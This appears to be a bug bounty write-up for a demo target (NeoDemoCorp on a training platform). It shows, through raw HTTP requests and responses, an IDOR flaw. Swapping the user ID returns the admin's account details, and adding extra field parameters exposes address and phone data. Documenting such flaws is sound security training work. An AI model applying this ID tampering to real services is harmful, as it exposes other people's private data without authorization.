# YesWeHAck - NeoDemoCorp reports

# IDOR

* On login, there is a request to get user's informations : 

```
GET /users/getinfo/1248/?fields[]=email&fields[]=role HTTP/1.1
Host: c5b5fc6e00b57e3da2da2e7a9c52dc17.bountystarter.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:81.0) Gecko/20100101 Firefox/81.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Connection: close
Referer: https://c5b5fc6e00b57e3da2da2e7a9c52dc17.bountystarter.com/
Cookie: csrfToken=XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX; CAKEPHP=XXXXXXXXXXXX
```

```
{"email":"banane@patate.fr","role":"user"}
```

* We can change user's ID 1248 => 1 to get admin's informations

```
GET /users/getinfo/1/?fields[]=email&fields[]=role HTTP/1.1
Host: c5b5fc6e00b57e3da2da2e7a9c52dc17.bountystarter.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:81.0) Gecko/20100101 Firefox/81.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Connection: close
Referer: https://c5b5fc6e00b57e3da2da2e7a9c52dc17.bountystarter.com/
Cookie: csrfToken=XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX; CAKEPHP=XXXXXXXXXXXX
```

```
{"email":"joe@neodemo.corp","role":"admin"}
```

* Then, we can add parameters to the request to get more inforamtions

```
GET /users/getinfo/1/?fields[]=email&fields[]=role&fields[]=address&fields[]=zipcode&fields[]=phone HTTP/1.1
Host: c5b5fc6e00b57e3da2da2e7a9c52dc17.bountystarter.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:81.0) Gecko/20100101 Firefox/81.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Connection: close
Referer: https://c5b5fc6e00b57e3da2da2e7a9c52dc17.bountystarter.com/
Cookie: csrfToken=XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX; CAKEPHP=XXXXXXXXXXXX
```

```
{"email":"joe@neodemo.corp","role":"admin","address":"2884 Elian Extension\nRolfsonfort, IN 38630-6178","zipcode":"63883-16","phone":"485.580.4012"}
```
